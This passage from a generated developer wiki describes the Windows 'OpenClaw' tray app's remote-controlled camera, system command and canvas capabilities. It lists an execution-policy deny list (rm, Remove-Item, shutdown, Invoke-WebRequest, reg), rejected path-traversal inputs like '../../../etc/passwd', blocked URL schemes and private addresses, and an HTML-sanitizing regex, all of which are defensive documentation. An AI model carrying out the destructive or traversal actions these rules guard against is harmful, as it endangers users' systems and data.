**Sources:** [src/OpenClaw.Shared/Capabilities/ScreenCapability.cs](), [src/OpenClaw.Tray.WinUI/Services/NodeService.cs:397-429](), [tests/OpenClaw.Shared.Tests/CapabilityTests.cs:638-788]()

---

### Camera Capability

Captures photos from webcams using Windows Media Capture APIs with multiple fallback strategies.

**Commands:**

| Command | Purpose | Arguments |
|---------|---------|-----------|
| `camera.list` | List available cameras | None |
| `camera.snap` | Capture photo | `deviceId`, `format`, `maxWidth`, `quality` |

**Capture Strategy with Fallbacks:**

The camera capture implementation uses a three-tier fallback strategy to maximize compatibility across different hardware and drivers:

```mermaid
graph TD
    Start[camera.snap] --> Init[Initialize MediaCapture]
    Init --> Try1{Photo Stream<br/>Available?}
    
    Try1 -->|Yes| Select1[Select Photo Encoding]
    Select1 --> Capture1[CapturePhotoToStreamAsync]
    Capture1 --> Success1{Success?}
    Success1 -->|Yes| Encode[Encode & Return]
    Success1 -->|No| Fallback1
    
    Try1 -->|No| Fallback1[Fallback 1: Frame Reader]
    Fallback1 --> Try2{Frame Source<br/>Available?}
    Try2 -->|Yes| StartReader[Start MediaFrameReader]
    StartReader --> WaitFrame[Wait for frame event]
    WaitFrame --> Success2{Got Frame?}
    Success2 -->|Yes| Encode
    Success2 -->|No/Timeout| Fallback2
    
    Try2 -->|No| Fallback2[Fallback 2: Preview Frame]
    Fallback2 --> StartPreview[Start preview stream]
    StartPreview --> GrabFrame[GetPreviewFrameAsync]
    GrabFrame --> StopPreview[Stop preview]
    StopPreview --> Encode
    
    Encode --> Return[Return CameraSnapResult]
```

**Fallback Details:**

1. **Primary: Photo Stream** ([src/OpenClaw.Tray.WinUI/Services/CameraCaptureService.cs:79-106]()):
   - Uses `MediaCapture.CapturePhotoToStreamAsync()`
   - Prefers JPEG/MJPG encodings
   - Fastest and highest quality
   - May fail if driver doesn't support photo mode

2. **Fallback 1: Frame Reader** ([src/OpenClaw.Tray.WinUI/Services/CameraCaptureService.cs:233-311]()):
   - Uses `MediaFrameReader` with color frame source
   - Grabs single frame from video stream
   - 2-second timeout for frame arrival
   - Handles cameras that only support video mode

3. **Fallback 2: Preview Frame** ([src/OpenClaw.Tray.WinUI/Services/CameraCaptureService.cs:349-406]()):
   - Starts preview stream with `StartPreviewAsync()`
   - Calls `GetPreviewFrameAsync()` to grab one frame
   - Stops preview immediately after capture
   - Last resort for limited drivers

**Permission Handling:**

Camera access requires Windows privacy permissions. When access is denied:

```csharp
catch (UnauthorizedAccessException ex)
{
    // Show toast notification with instructions
    // Throw with helpful error message
}
```

**Sources:** [src/OpenClaw.Shared/Capabilities/CameraCapability.cs](), [src/OpenClaw.Tray.WinUI/Services/CameraCaptureService.cs:1-525](), [tests/OpenClaw.Shared.Tests/CapabilityTests.cs:790-899]()

---

## Response Format

All capability commands return a standardized response structure sent to the gateway as `node.invoke.result`:

```mermaid
graph LR
    subgraph "Success Response"
        S1["ok: true"]
        S2["payload: {...}"]
        S3["error: null"]
    end
    
    subgraph "Error Response"
        E1["ok: false"]
        E2["payload: null"]
        E3["error: {message}"]
    end
    
    subgraph "Common Fields"
        C1["id: requestId"]
        C2["nodeId: deviceId"]
    end
```

**Gateway Protocol:**

The `WindowsNodeClient` wraps capability responses into the gateway protocol:

```json
{
  "type": "req",
  "id": "generated-guid",
  "method": "node.invoke.result",
  "params": {
    "id": "original-request-id",
    "nodeId": "device-ed25519-id",
    "ok": true,
    "payload": { /* capability-specific data */ },
    "error": null
  }
}
```

**Sources:** [src/OpenClaw.Shared/WindowsNodeClient.cs:417-441](), [src/OpenClaw.Shared/Capabilities/NodeInvokeResponse.cs]()

---

## Testing

The capability system includes comprehensive unit tests that verify:

- **Command Parsing** ([tests/OpenClaw.Shared.Tests/CapabilityTests.cs:15-327]()): Argument extraction, defaults, type conversion
- **Error Handling**: Missing arguments, invalid formats, handler failures
- **Event Raising**: Capabilities correctly invoke events for UI integration
- **Security Validation**: URL filtering, command allowlists, pattern matching
- **Fallback Logic**: Camera capture fallback chain, frame reader behavior

**Test Structure:**

```mermaid
graph TB
    subgraph "SystemCapabilityTests"
        T1[notify command]
        T2[run command formats]
        T3[which command]
        T4[exec approvals]
    end
    
    subgraph "CanvasCapabilityTests"
        T5[present/hide]
        T6[navigate/eval]
        T7[snapshot]
        T8[A2UI push/reset]
    end
    
    subgraph "ScreenCapabilityTests"
        T9[capture args]
        T10[list screens]
        T11[data URI format]
    end
    
    subgraph "CameraCapabilityTests"
        T12[list cameras]
        T13[snap args/defaults]
        T14[error handling]
    end
    
    subgraph "ExecApprovalPolicyTests"
        T15[pattern matching]
        T16[shell filtering]
        T17[rule precedence]
        T18[CRUD operations]
    end
```

**Mock Infrastructure:**

Tests use mock implementations to avoid hardware dependencies:

- `FakeCommandRunner`: Returns fake command output
- `MockCommandRunner`: Simulates process execution
- `NullLogger`: Silent logger for test isolation

**Sources:** [tests/OpenClaw.Shared.Tests/CapabilityTests.cs:1-900](), [tests/OpenClaw.Shared.Tests/ExecApprovalPolicyTests.cs:1-394]()

---

# Page: System Capability

# System Capability

<details>
<summary>Relevant source files</summary>

The following files were used as context for generating this wiki page:

- [src/OpenClaw.Shared/Capabilities/SystemCapability.cs](src/OpenClaw.Shared/Capabilities/SystemCapability.cs)
- [tests/OpenClaw.Shared.Tests/CapabilityTests.cs](tests/OpenClaw.Shared.Tests/CapabilityTests.cs)
- [tests/OpenClaw.Shared.Tests/ExecApprovalPolicyTests.cs](tests/OpenClaw.Shared.Tests/ExecApprovalPolicyTests.cs)

</details>



The System Capability provides remote control of Windows system functions when Node Mode is enabled. It implements system-level operations including toast notifications, command execution, and executable resolution. The capability enforces security through configurable execution approval policies that use pattern matching to allow or deny commands.

For information about enabling Node Mode, see [Node Client & Pairing](#4.1). For other capabilities (canvas, screen, camera), see [Canvas Capability](#4.4) and [Screen & Camera Capabilities](#4.5).

---

## Architecture Overview

The `SystemCapability` class inherits from `NodeCapabilityBase` and registers itself as the handler for all commands in the `system` category. When the OpenClaw Gateway sends a `node.invoke.request` with a system command, the `WindowsNodeClient` routes it to this capability for execution.

```mermaid
graph TB
    Gateway["OpenClaw Gateway"]
    NodeClient["WindowsNodeClient"]
    SysCap["SystemCapability"]
    CommandRunner["ICommandRunner"]
    ExecPolicy["ExecApprovalPolicy"]
    TrayApp["Tray Application<br/>(UI Thread)"]
    
    Gateway -->|"node.invoke.request"| NodeClient
    NodeClient -->|"ExecuteAsync()"| SysCap
    
    SysCap -->|"NotifyRequested event"| TrayApp
    SysCap -->|"RunAsync()"| CommandRunner
    SysCap -->|"Evaluate()"| ExecPolicy
    
    ExecPolicy -->|"reads/writes"| PolicyFile["exec-policy.json<br/>%LOCALAPPDATA%"]
    CommandRunner -->|"Process.Start()"| WindowsProcess["Windows Process"]
    
    SysCap -->|"NodeInvokeResponse"| NodeClient
    NodeClient -->|"node.invoke.result"| Gateway
```

**SystemCapability Command Registration and Dispatch Flow**

Sources: [src/OpenClaw.Shared/Capabilities/SystemCapability.cs:1-67]()

---

## Command Categories

The System Capability supports five commands across three functional categories:

| Command | Category | Purpose | Security Layer |
|---------|----------|---------|----------------|
| `system.notify` | Notifications | Display toast notifications | None |
| `system.run` | Execution | Execute shell commands | Exec approval policy |
| `system.which` | Discovery | Resolve executable paths | Path traversal protection |
| `system.execApprovals.get` | Policy Management | Retrieve current policy | None |
| `system.execApprovals.set` | Policy Management | Update policy rules | None |

Sources: [src/OpenClaw.Shared/Capabilities/SystemCapability.cs:16-23]()

---

## System Notifications (system.notify)

The `system.notify` command displays Windows toast notifications. The capability raises a `NotifyRequested` event that the tray application handles on the UI thread.

### Request Structure

```json
{
  "command": "system.notify",
  "args": {
    "title": "OpenClaw",
    "body": "Message text",
    "subtitle": "Optional subtitle",
    "sound": true
  }
}
```

### Implementation Flow

```mermaid
sequenceDiagram
    participant Gateway
    participant SystemCapability
    participant TrayApp
    participant WindowsNotification
    
    Gateway->>SystemCapability: system.notify request
    SystemCapability->>SystemCapability: Parse args (title, body, sound)
    SystemCapability->>TrayApp: NotifyRequested event
    TrayApp->>WindowsNotification: Show toast notification
    WindowsNotification-->>User: Display notification
    SystemCapability->>Gateway: Success response
```

**Notification Event Flow from Gateway to Windows Toast**

The `SystemNotifyArgs` class carries the notification parameters:

```csharp
public class SystemNotifyArgs : EventArgs
{
    public string Title { get; set; } = "";
    public string Body { get; set; } = "";
    public string? Subtitle { get; set; }
    public bool PlaySound { get; set; } = true;
}
```

Default values: `title` defaults to "OpenClaw" if not provided, `sound` defaults to `true`.

Sources: [src/OpenClaw.Shared/Capabilities/SystemCapability.cs:69-88](), [src/OpenClaw.Shared/Capabilities/SystemCapability.cs:376-382](), [tests/OpenClaw.Shared.Tests/CapabilityTests.cs:33-72]()

---

## Command Execution (system.run)

The `system.run` command executes shell commands through the `ICommandRunner` interface. This is the most security-sensitive operation in the capability system, protected by the execution approval policy.

### Command Runner Architecture

```mermaid
graph LR
    SystemCapability["SystemCapability"]
    ICommandRunner["ICommandRunner<br/>(interface)"]
    LocalRunner["LocalCommandRunner"]
    FutureDocker["DockerCommandRunner<br/>(future)"]
    FutureWSL["WSLCommandRunner<br/>(future)"]
    
    SystemCapability -->|"SetCommandRunner()"| ICommandRunner
    ICommandRunner -.->|"implements"| LocalRunner
    ICommandRunner -.->|"future"| FutureDocker
    ICommandRunner -.->|"future"| FutureWSL
    
    LocalRunner -->|"Process.Start()"| WindowsProcess["Windows Process"]
```

**Command Runner Plugin Architecture**

The `ICommandRunner` interface enables swappable execution backends:

```csharp
public interface ICommandRunner
{
    string Name { get; }
    Task<CommandResult> RunAsync(CommandRequest request, CancellationToken ct = default);
}
```

### Request Parameters

| Parameter | Type | Required | Default | Description |
|-----------|------|----------|---------|-------------|
| `command` | string or array | Yes | - | Command to execute (argv format or string) |
| `args` | array | No | - | Arguments (when command is string) |
| `shell` | string | No | auto | Shell to use (powershell, cmd, pwsh, bash) |
| `cwd` | string | No | - | Working directory |
| `timeoutMs` | int | No | 30000 | Execution timeout in milliseconds |
| `env` | object | No | - | Environment variables (key-value pairs) |

### Command Format Flexibility

The `command` parameter accepts multiple formats for compatibility:

```json
// Array format (OpenClaw standard)
{"command": ["echo", "hello", "world"]}

// String format with separate args
{"command": "echo", "args": ["hello", "world"]}

// Single string format
{"command": "hostname"}
```

Sources: [src/OpenClaw.Shared/Capabilities/SystemCapability.cs:161-273](), [tests/OpenClaw.Shared.Tests/CapabilityTests.cs:91-201]()

---

## Execution Approval Policy

The `ExecApprovalPolicy` class implements a rule-based security system that controls which commands can execute. The policy uses pattern matching with wildcards and supports shell-specific rules.

### Policy Architecture

```mermaid
graph TB
    SystemRun["system.run command"]
    PolicyCheck{"ExecApprovalPolicy?"}
    Evaluate["Evaluate(command, shell)"]
    MatchRules["Match against rules<br/>(first match wins)"]
    DefaultAction["Apply defaultAction"]
    Execute["ICommandRunner.RunAsync()"]
    Deny["Return error:<br/>Command denied"]
    
    SystemRun --> PolicyCheck
    PolicyCheck -->|"policy set"| Evaluate
    PolicyCheck -->|"no policy"| Execute
    
    Evaluate --> MatchRules
    MatchRules -->|"rule matches"| CheckAction{Action?}
    MatchRules -->|"no match"| DefaultAction
    
    CheckAction -->|"Allow"| Execute
    CheckAction -->|"Deny"| Deny
    CheckAction -->|"Prompt"| Deny
    
    DefaultAction -->|"Allow"| Execute
    DefaultAction -->|"Deny"| Deny
```

**Execution Approval Policy Decision Flow**

### Policy File Structure

The policy is stored in `%LOCALAPPDATA%\OpenClawTray\exec-policy.json`:

```json
{
  "defaultAction": "deny",
  "rules": [
    {
      "pattern": "echo *",
      "action": "allow",
      "description": "Safe echo commands",
      "enabled": true,
      "shells": null
    },
    {
      "pattern": "Get-*",
      "action": "allow",
      "description": "PowerShell Get cmdlets",
      "shells": ["powershell", "pwsh"]
    },
    {
      "pattern": "rm *",
      "action": "deny",
      "description": "Block file deletion"
    }
  ]
}
```

### Default Security Rules

The policy ships with conservative defaults that allow safe read-only operations while blocking destructive commands:

**Allowed Commands:**
- `echo *` - Echo commands
- `hostname` - Get hostname
- `whoami` - Current user
- `Get-*` - PowerShell Get cmdlets (read-only)
- `date` - Current date
- `pwd` - Current directory
- `ls *`, `dir *` - Directory listing

**Blocked Commands:**
- `rm *`, `Remove-Item *` - File deletion
- `shutdown *` - System shutdown
- `Invoke-WebRequest *` - Web downloads
- `reg *` - Registry edits
- Any command not explicitly allowed

### Pattern Matching Rules

The policy uses glob-style pattern matching:

| Pattern | Matches | Example |
|---------|---------|---------|
| `*` | Any command | All commands |
| `echo *` | Commands starting with "echo" | `echo hello world` |
| `Get-*` | Commands starting with "Get-" | `Get-Process`, `Get-Location` |
| `*dangerous*` | Commands containing "dangerous" | `run dangerous script` |
| `dir ?` | "dir" followed by single char | `dir a` but not `dir ab` |

Pattern matching is **case-insensitive** on Windows.

### Shell Filtering

Rules can be restricted to specific shells using the `shells` array:

```json
{
  "pattern": "Get-*",
  "action": "allow",
  "shells": ["powershell", "pwsh"]
}
```

This rule only applies when `shell` is "powershell" or "pwsh". Commands in other shells fall through to the next rule.

### Rule Evaluation Algorithm

```mermaid
graph TD
    Start["Evaluate(command, shell)"]
    Empty{"command empty?"}
    IterateRules["Iterate through rules"]
    CheckEnabled{"rule.Enabled?"}
    CheckShell{"shell matches<br/>rule.Shells?"}
    CheckPattern{"pattern matches<br/>command?"}
    ReturnAction["Return rule.Action"]
    NextRule["Next rule"]
    ReturnDefault["Return defaultAction"]
    
    Start --> Empty
    Empty -->|"yes"| DenyEmpty["Deny: Empty command"]
    Empty -->|"no"| IterateRules
    
    IterateRules --> CheckEnabled
    CheckEnabled -->|"no"| NextRule
    CheckEnabled -->|"yes"| CheckShell
    
    CheckShell -->|"no match"| NextRule
    CheckShell -->|"match or null"| CheckPattern
    
    CheckPattern -->|"yes"| ReturnAction
    CheckPattern -->|"no"| NextRule
    
    NextRule --> IterateRules
    IterateRules -->|"no more rules"| ReturnDefault
```

**Rule Evaluation Algorithm: First Match Wins**

Sources: [src/OpenClaw.Shared/Capabilities/SystemCapability.cs:236-245](), [tests/OpenClaw.Shared.Tests/ExecApprovalPolicyTests.cs:29-393]()

---

## Policy Management Commands

The `system.execApprovals.get` and `system.execApprovals.set` commands allow remote management of the execution approval policy.

### Getting Current Policy (system.execApprovals.get)

Returns the current policy configuration:

```json
{
  "enabled": true,
  "defaultAction": "deny",
  "rules": [
    {
      "pattern": "echo *",
      "action": "allow",
      "shells": null,
      "description": "Safe echo commands",
      "enabled": true
    }
  ]
}
```

If no policy is configured, returns:

```json
{
  "enabled": false,
  "message": "No exec policy configured"
}
```

### Setting Policy Rules (system.execApprovals.set)

Updates the policy with new rules:

```json
{
  "defaultAction": "deny",
  "rules": [
    {
      "pattern": "test *",
      "action": "allow",
      "description": "Test commands"
    }
  ]
}
```

The `SetRules()` method automatically persists changes to `exec-policy.json`.

Sources: [src/OpenClaw.Shared/Capabilities/SystemCapability.cs:275-373](), [tests/OpenClaw.Shared.Tests/ExecApprovalPolicyTests.cs:485-560]()

---

## Executable Resolution (system.which)

The `system.which` command resolves executable names to their full paths by searching directories in the `PATH` environment variable. This matches the behavior of Unix `which` and PowerShell `Get-Command`.

### Request Format

```json
{
  "command": "system.which",
  "args": {
    "bins": ["cmd", "powershell", "git"]
  }
}
```

### Response Format

Returns only executables that were found:

```json
{
  "bins": {
    "cmd": "C:\\Windows\\System32\\cmd.exe",
    "powershell": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
  }
}
```

Missing executables (like `git` in this example) are omitted from the response.

### Path Resolution Algorithm

```mermaid
graph TD
    Start["ResolveExecutable(bin)"]
    CheckSeparators{"contains / or \\?"}
    RejectPath["Return null<br/>(path traversal)"]
    GetPathExt["Get PATHEXT env var"]
    SplitPath["Split PATH by ;"]
    IterateDirs["For each dir in PATH"]
    IterateExts["For each ext in PATHEXT"]
    Combine["Combine: dir + bin + ext"]
    Exists{"File.Exists?"}
    ReturnPath["Return full path"]
    NextExt["Next extension"]
    NextDir["Next directory"]
    NotFound["Return null"]
    
    Start --> CheckSeparators
    CheckSeparators -->|"yes"| RejectPath
    CheckSeparators -->|"no"| GetPathExt
    GetPathExt --> SplitPath
    SplitPath --> IterateDirs
    IterateDirs --> IterateExts
    IterateExts --> Combine
    Combine --> Exists
    Exists -->|"yes"| ReturnPath
    Exists -->|"no"| NextExt
    NextExt --> IterateExts
    IterateExts -->|"no more exts"| NextDir
    NextDir --> IterateDirs
    IterateDirs -->|"no more dirs"| NotFound
```

**Executable Resolution with PATH and PATHEXT**

### Security: Path Traversal Protection

The resolver **rejects** any binary name containing path separators (`/` or `\`) to prevent path traversal attacks:

```
❌ Rejected: "../../../etc/passwd"
❌ Rejected: "..\\..\\cmd"
❌ Rejected: "C:\\Windows\\cmd"
✅ Allowed: "cmd"
✅ Allowed: "git"
```

### Windows PATHEXT Handling

On Windows, the resolver checks all extensions listed in the `PATHEXT` environment variable (typically `.EXE;.CMD;.BAT;.COM`). For example, searching for `git` will try:
- `git.EXE`
- `git.CMD`
- `git.BAT`
- `git.COM`

Sources: [src/OpenClaw.Shared/Capabilities/SystemCapability.cs:90-159](), [tests/OpenClaw.Shared.Tests/CapabilityTests.cs:204-307]()

---

## Integration with Tray Application

The tray application integrates `SystemCapability` when Node Mode is enabled:

```mermaid
graph TB
    Settings["Settings Window"]
    NodeMode["Node Mode Toggle"]
    NodeClient["WindowsNodeClient"]
    SysCap["SystemCapability"]
    LocalRunner["LocalCommandRunner"]
    PolicyFile["exec-policy.json"]
    ExecPolicy["ExecApprovalPolicy"]
    
    Settings -->|"Enable Node Mode"| NodeMode
    NodeMode -->|"ConnectAsync()"| NodeClient
    NodeClient -->|"RegisterCapability()"| SysCap
    
    SysCap -->|"SetCommandRunner()"| LocalRunner
    SysCap -->|"SetApprovalPolicy()"| ExecPolicy
    
    PolicyFile -->|"Load()"| ExecPolicy
    
    SysCap -->|"NotifyRequested event"| NotifyHandler["Notification Handler<br/>(UI thread)"]
    NotifyHandler -->|"ShowToastNotification()"| WindowsToast["Windows Toast API"]
```

**SystemCapability Integration in Tray Application**

### Event Handler Pattern

The tray application subscribes to `NotifyRequested` events and marshals them to the UI thread:

```csharp
systemCapability.NotifyRequested += (sender, args) =>
{
    uiContext.Post(_ =>
    {
        ShowToastNotification(args.Title, args.Body, args.PlaySound);
    }, null);
};
```

### Command Runner Initialization

The `LocalCommandRunner` is set via dependency injection:

```csharp
var commandRunner = new LocalCommandRunner(logger);
systemCapability.SetCommandRunner(commandRunner);
```

### Policy Initialization

The execution approval policy loads from `%LOCALAPPDATA%\OpenClawTray\exec-policy.json`:

```csharp
var policyPath = Path.Combine(
    Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
    "OpenClawTray"
);
var policy = new ExecApprovalPolicy(policyPath, logger);
systemCapability.SetApprovalPolicy(policy);
```

Sources: [src/OpenClaw.Shared/Capabilities/SystemCapability.cs:36-54](), [tests/OpenClaw.Shared.Tests/ExecApprovalPolicyTests.cs:396-468]()

---

## Error Handling

The `SystemCapability` returns structured error responses for various failure scenarios:

| Error Condition | Command | Error Message |
|-----------------|---------|---------------|
| Unknown command | Any | `"Unknown command: {command}"` |
| No command runner set | `system.run` | `"Command execution not available"` |
| Missing command parameter | `system.run` | `"Missing command parameter"` |
| Policy denial | `system.run` | `"Command denied by exec policy: {reason}"` |
| Empty bins array | `system.which` | `"Missing bins parameter"` |
| No policy configured | `system.execApprovals.set` | `"No exec policy configured"` |
| Command execution failure | `system.run` | `"Execution failed: {exception.Message}"` |

All errors return a `NodeInvokeResponse` with `Ok = false` and a descriptive `Error` string.

Sources: [src/OpenClaw.Shared/Capabilities/SystemCapability.cs:56-273](), [tests/OpenClaw.Shared.Tests/CapabilityTests.cs:75-182]()

---

# Page: Canvas Capability

# Canvas Capability

<details>
<summary>Relevant source files</summary>

The following files were used as context for generating this wiki page:

- [src/OpenClaw.Shared/Capabilities/SystemCapability.cs](src/OpenClaw.Shared/Capabilities/SystemCapability.cs)
- [src/OpenClaw.Shared/WindowsNodeClient.cs](src/OpenClaw.Shared/WindowsNodeClient.cs)
- [src/OpenClaw.Tray.WinUI/Services/CameraCaptureService.cs](src/OpenClaw.Tray.WinUI/Services/CameraCaptureService.cs)
- [src/OpenClaw.Tray.WinUI/Services/NodeService.cs](src/OpenClaw.Tray.WinUI/Services/NodeService.cs)
- [src/OpenClaw.Tray.WinUI/Windows/CanvasWindow.xaml.cs](src/OpenClaw.Tray.WinUI/Windows/CanvasWindow.xaml.cs)
- [tests/OpenClaw.Shared.Tests/CapabilityTests.cs](tests/OpenClaw.Shared.Tests/CapabilityTests.cs)
- [tests/OpenClaw.Shared.Tests/ExecApprovalPolicyTests.cs](tests/OpenClaw.Shared.Tests/ExecApprovalPolicyTests.cs)

</details>



The Canvas Capability provides remote control of a WebView2-based browser window, enabling the OpenClaw gateway to display web content, execute JavaScript, capture screenshots, and deliver Adaptive UI (A2UI) messages to the Windows node. This capability is part of the experimental Node Mode feature.

For general Node Mode architecture and device pairing, see [Node Client & Pairing](#4.1). For system-level commands like notifications and execution, see [System Capability](#4.3). For screen capture independent of the canvas, see [Screen & Camera Capabilities](#4.5).

---

## Architecture Overview

The canvas capability follows a three-layer architecture: the capability handler in the shared library, the service layer that bridges to the UI thread, and the WebView2 window implementation.

**Canvas Command Flow**

```mermaid
flowchart TB
    Gateway["OpenClaw Gateway"]
    NodeClient["WindowsNodeClient"]
    CanvasCap["CanvasCapability"]
    NodeSvc["NodeService"]
    CanvasWin["CanvasWindow"]
    WebView["CoreWebView2"]
    
    Gateway -->|"node.invoke.request<br/>(canvas.present)"| NodeClient
    NodeClient -->|"ExecuteAsync(request)"| CanvasCap
    CanvasCap -->|"PresentRequested event"| NodeSvc
    NodeSvc -->|"_dispatcherQueue.TryEnqueue()"| NodeSvc
    NodeSvc -->|"Create/configure window"| CanvasWin
    CanvasWin -->|"Navigate/LoadHtml/etc"| WebView
    
    WebView -->|"CapturePreviewAsync"| CanvasWin
    CanvasWin -->|"base64 image"| NodeSvc
    NodeSvc -->|"SnapshotRequested result"| CanvasCap
    CanvasCap -->|"node.invoke.result"| NodeClient
    NodeClient -->|"WebSocket response"| Gateway
    
    style CanvasCap fill:#e1f5ff
    style CanvasWin fill:#e1ffe1
```

**Sources:**
- [src/OpenClaw.Shared/WindowsNodeClient.cs:387-415]()
- [src/OpenClaw.Tray.WinUI/Services/NodeService.cs:114-123]()
- [src/OpenClaw.Tray.WinUI/Services/NodeService.cs:164-393]()

---

## Capability Registration

The `CanvasCapability` class is instantiated and registered during node initialization. It declares the `"canvas"` category and seven commands.

**Registration in NodeService**

| Step | Component | Action |
|------|-----------|--------|
| 1 | `NodeService.RegisterCapabilities()` | Creates `new CanvasCapability(_logger)` |
| 2 | Event wiring | Subscribes to 7 event handlers (`PresentRequested`, `HideRequested`, etc.) |
| 3 | `WindowsNodeClient.RegisterCapability()` | Adds to `_capabilities` list and updates `_registration` |
| 4 | Gateway connect | Sends capability list in `connect` message |

**Command Registration Mapping**

```mermaid
flowchart LR
    subgraph CanvasCapability
        Category["Category: 'canvas'"]
        Commands["Commands[7]"]
    end
    
    subgraph "Registered Commands"
        Present["canvas.present"]
        Hide["canvas.hide"]
        Navigate["canvas.navigate"]
        Eval["canvas.eval"]
        Snapshot["canvas.snapshot"]
        A2UIPush["canvas.a2ui.push"]
        A2UIReset["canvas.a2ui.reset"]
    end
    
    Commands --> Present
    Commands --> Hide
    Commands --> Navigate
    Commands --> Eval
    Commands --> Snapshot
    Commands --> A2UIPush
    Commands --> A2UIReset
    
    style CanvasCapability fill:#e1f5ff
```

**Sources:**
- [src/OpenClaw.Tray.WinUI/Services/NodeService.cs:114-123]()
- [src/OpenClaw.Shared/Capabilities/CanvasCapability.cs:14-43]()

---

## Command: canvas.present

The `canvas.present` command creates or reconfigures the canvas window, optionally loading initial content.

**Parameters**

| Parameter | Type | Default | Description |
|-----------|------|---------|-------------|
| `url` | string | `null` | URL to navigate to (validated) |
| `html` | string | `null` | HTML content to load directly (sanitized) |
| `width` | number | `800` | Window width in pixels |
| `height` | number | `600` | Window height in pixels |
| `x` | number | `-1` | Window X position (-1 = centered) |
| `y` | number | `-1` | Window Y position (-1 = centered) |
| `title` | string | `"Canvas"` | Window title |
| `alwaysOnTop` | boolean | `false` | Keep window above others |

**Execution Flow**

```mermaid
sequenceDiagram
    participant Gateway
    participant CanvasCapability
    participant NodeService
    participant CanvasWindow
    participant CoreWebView2
    
    Gateway->>CanvasCapability: ExecuteAsync(canvas.present)
    CanvasCapability->>CanvasCapability: Parse args (url, width, etc)
    CanvasCapability->>NodeService: PresentRequested event
    NodeService->>NodeService: _dispatcherQueue.TryEnqueue()
    
    alt Window exists and not closed
        NodeService->>CanvasWindow: SetSize(width, height)
        NodeService->>CanvasWindow: SetPosition(x, y)
        NodeService->>CanvasWindow: SetAlwaysOnTop(alwaysOnTop)
    else Window null or closed
        NodeService->>CanvasWindow: new CanvasWindow()
    end
    
    alt url provided
        NodeService->>CanvasWindow: Navigate(url)
        CanvasWindow->>CanvasWindow: IsUrlSafe(url) validation
        CanvasWindow->>CoreWebView2: Navigate(url)
    else html provided
        NodeService->>CanvasWindow: LoadHtml(html)
        CanvasWindow->>CanvasWindow: SanitizeHtml(html)
        CanvasWindow->>CoreWebView2: NavigateToString(html)
    end
    
    NodeService->>CanvasWindow: Activate()
    CanvasCapability->>Gateway: Success response
```

**URL Security Validation**

The `CanvasWindow.IsUrlSafe()` method blocks dangerous schemes and private network addresses:

- **Blocked schemes**: `file://`, `javascript:`, `data:`, `vbscript:`
- **Blocked IPv4**: `localhost`, `127.*`, `10.*`, `192.168.*`, `172.16-31.*`, `169.254.*`
- **Blocked IPv6**: `::1`, `0:0:0:0:0:0:0:1`
- **Exception**: `data:text/html` and `data:text/plain` URLs are allowed

**HTML Sanitization**

The `SanitizeHtml()` method strips dangerous embedded elements:

```csharp
// Removes: <iframe>, <object>, <embed>, <applet> tags
html = Regex.Replace(html, @"<\s*(iframe|object|embed|applet)\b[^>]*>.*?<\s*/\s*\1\s*>", 
    "<!-- blocked -->", RegexOptions.IgnoreCase | RegexOptions.Singleline);
```

**Sources:**
- [tests/OpenClaw.Shared.Tests/CapabilityTests.cs:352-396]()
- [src/OpenClaw.Tray.WinUI/Services/NodeService.cs:166-204]()
- [src/OpenClaw.Tray.WinUI/Windows/CanvasWindow.xaml.cs:33-63]()
- [src/OpenClaw.Tray.WinUI/Windows/CanvasWindow.xaml.cs:203-257]()

---

## Command: canvas.hide

The `canvas.hide` command closes the canvas window without destroying the capability. A subsequent `canvas.present` will create a new window.

**Execution**

```mermaid
flowchart LR
    Request["canvas.hide request"] --> Cap["CanvasCapability"]
    Cap --> Event["HideRequested event"]
    Event --> NS["NodeService.OnCanvasHide()"]
    NS --> Check{"_canvasWindow != null<br/>&& !IsClosed?"}
    Check -->|Yes| Close["_canvasWindow.Close()"]
    Check -->|No| Ignore["Log warning, ignore"]
    Close --> Null["_canvasWindow = null"]
```

**Sources:**
- [tests/OpenClaw.Shared.Tests/CapabilityTests.cs:398-409]()
- [src/OpenClaw.Tray.WinUI/Services/NodeService.cs:206-224]()

---

## Command: canvas.navigate

The `canvas.navigate` command changes the URL of an already-presented canvas window. The window must already exist (created via `canvas.present`).

**Parameters**

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `url` | string | Yes | URL to navigate to (validated) |

**Validation**

- Same URL security checks as `canvas.present`
- Returns error if `url` is missing
- Logs warning if canvas window is not available

**Sources:**
- [tests/OpenClaw.Shared.Tests/CapabilityTests.cs:411-419]()
- [tests/OpenClaw.Shared.Tests/CapabilityTests.cs:523-538]()
- [src/OpenClaw.Tray.WinUI/Services/NodeService.cs:226-246]()

---

## Command: canvas.eval

The `canvas.eval` command executes JavaScript in the canvas window's WebView2 context and returns the serialized result.

**Parameters**

| Parameter | Type | Required | Aliases | Description |
|-----------|------|----------|---------|-------------|
| `script` | string | Yes | `javaScript` | JavaScript code to execute |

**Execution and Thread Marshaling**

```mermaid
sequenceDiagram
    participant Gateway
    participant CanvasCap as CanvasCapability
    participant EvalHandler as EvalRequested handler
    participant NodeService
    participant DispatcherQueue
    participant CanvasWindow
    participant WebView2
    
    Gateway->>CanvasCap: ExecuteAsync(canvas.eval)
    CanvasCap->>CanvasCap: GetStringArg("script")
    CanvasCap->>EvalHandler: await handler(script)
    EvalHandler->>NodeService: OnCanvasEval(script)
    NodeService->>NodeService: Create TaskCompletionSource
    NodeService->>DispatcherQueue: TryEnqueue(async lambda)
    
    Note over DispatcherQueue: UI thread
    DispatcherQueue->>CanvasWindow: await EvalAsync(script)
    CanvasWindow->>CanvasWindow: Truncate script for logging
    CanvasWindow->>WebView2: ExecuteScriptAsync(script)
    WebView2-->>CanvasWindow: JSON-serialized result
    CanvasWindow-->>DispatcherQueue: result string
    
    DispatcherQueue->>NodeService: tcs.SetResult(result)
    NodeService-->>EvalHandler: result
    EvalHandler-->>CanvasCap: result
    CanvasCap->>Gateway: Success(payload: result)
```

**Return Value**

The result is the JSON-serialized return value of the script. For example:
- `"document.title"` → `"\"Page Title\""`
- `"2 + 2"` → `"4"`
- `"null"` → `"null"`

**Error Handling**

- Returns error if canvas window is not available
- Returns error if script execution throws exception
- Exception message included in error response

**Sources:**
- [tests/OpenClaw.Shared.Tests/CapabilityTests.cs:421-467]()
- [src/OpenClaw.Tray.WinUI/Services/NodeService.cs:248-273]()
- [src/OpenClaw.Tray.WinUI/Windows/CanvasWindow.xaml.cs:262-274]()

---

## Command: canvas.snapshot

The `canvas.snapshot` command captures the current canvas window content as a base64-encoded image.

**Parameters**

| Parameter | Type | Default | Description |
